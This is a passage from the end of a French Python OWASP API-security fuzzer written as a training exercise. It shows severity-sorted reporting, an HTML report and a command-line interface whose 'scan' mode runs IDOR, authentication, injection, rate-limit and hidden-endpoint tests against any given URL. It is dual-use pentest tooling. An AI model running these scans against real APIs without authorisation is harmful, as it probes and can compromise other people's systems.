    severity_icons = {"CRITIQUE": "🔴", "ÉLEVÉE": "🟠", "MODÉRÉE": "🟡", "FAIBLE": "🟢"}

    if fuzzer.findings:
        for f in sorted(fuzzer.findings,
                        key=lambda x: {"CRITIQUE":0,"ÉLEVÉE":1,"MODÉRÉE":2,"FAIBLE":3}.get(x["severity"],9)):
            icon = severity_icons.get(f["severity"], "⚪")
            print(f"  {icon} [{f['severity']}] {f['title']}")
            print(f"     {f['owasp']}")
            print(f"     → {f['remediation'][:80]}...")
            print()
    else:
        print("  ✅  Aucune vulnérabilité détectée.")

    counts = defaultdict(int)
    for f in fuzzer.findings:
        counts[f["severity"]] += 1

    print(f"  {'─'*60}")
    print(f"  🔴 Critique : {counts['CRITIQUE']}  |  🟠 Élevée : {counts['ÉLEVÉE']}  |  "
          f"🟡 Modérée : {counts['MODÉRÉE']}  |  🟢 Faible : {counts['FAIBLE']}")
    print(f"  📡 Requêtes envoyées : {fuzzer._req_count}")

    # Générer le rapport HTML
    report_path = Path("/tmp/rapport_pentest_api.html")
    fuzzer.generate_report(report_path)

    print(f"""
  {SEP}
  📋  BILAN — OWASP API Security Top 10

  Ce scan a détecté des vulnérabilités typiques d'une API
  de développement non durcie :

  🔴  IDOR (API1) : n'importe quel ID est accessible
  🔴  Auth absente (API2) : endpoint admin sans token
  🔴  SQLi (API10) : erreur SQL exposée dans la réponse
  🔴  SSRF (API7) : fetch d'URLs internes possible
  🟠  Rate limiting absent (API4) : brute force possible
  🟡  Headers de sécurité manquants (API8)
  🟡  Endpoints non documentés (API9)

  En production, chacune de ces failles peut mener à :
  Vol de données personnelles → RGPD Art. 33 (notification 72h)
  Exécution de code → ISO 27001 incident critique
  Perte de disponibilité → NIS2 Art. 21

  Ouvrir {report_path} dans un navigateur
  pour le rapport HTML complet.
  {SEP}
""")


# ════════════════════════════════════════════════════════════════
# CLI
# ════════════════════════════════════════════════════════════════

def main():
    print(__doc__)
    import argparse
    parser = argparse.ArgumentParser(
        description="Fuzzer d'API OWASP — Bouclier Numérique Jour 21",
    )
    sub = parser.add_subparsers(dest="cmd")
    sub.add_parser("demo", help="Démonstration sur API vulnérable locale")

    p_scan = sub.add_parser("scan", help="Scanner une API réelle")
    p_scan.add_argument("url", help="URL de base de l'API (ex: https://api.monapp.com)")
    p_scan.add_argument("--token", help="Token Bearer d'authentification")
    p_scan.add_argument("--endpoint", "-e", action="append",
                        help="Endpoint à tester (répétable : -e /api/users -e /api/login)")
    p_scan.add_argument("--output", "-o", help="Fichier HTML de rapport (optionnel)")
    p_scan.add_argument("--rate", type=float, default=0.2,
                        help="Délai entre requêtes en secondes (défaut: 0.2)")

    args = parser.parse_args()

    if not args.cmd or args.cmd == "demo":
        run_demo()
        return

    if args.cmd == "scan":
        fuzzer = ApiFuzzer(
            base_url=args.url,
            token=args.token,
            rate_limit=args.rate,
        )

        endpoints = args.endpoint or ["/api/v1/users/1"]

        print(f"\n  🎯  Cible : {args.url}")
        print(f"  📡  Endpoints : {endpoints}\n")

        fuzzer.test_security_headers()
        fuzzer.test_hidden_endpoints()
        for ep in endpoints:
            fuzzer.test_auth(ep)
            fuzzer.test_idor(ep)
            fuzzer.test_injections(ep)
            fuzzer.test_http_methods(ep)
        fuzzer.test_rate_limiting(endpoints[0])

        output = Path(args.output) if args.output else Path("rapport_pentest.html")
        fuzzer.generate_report(output)
        print(f"\n  ✅  Scan terminé · {len(fuzzer.findings)} finding(s) · Rapport : {output}")


if __name__ == "__main__":
    main()
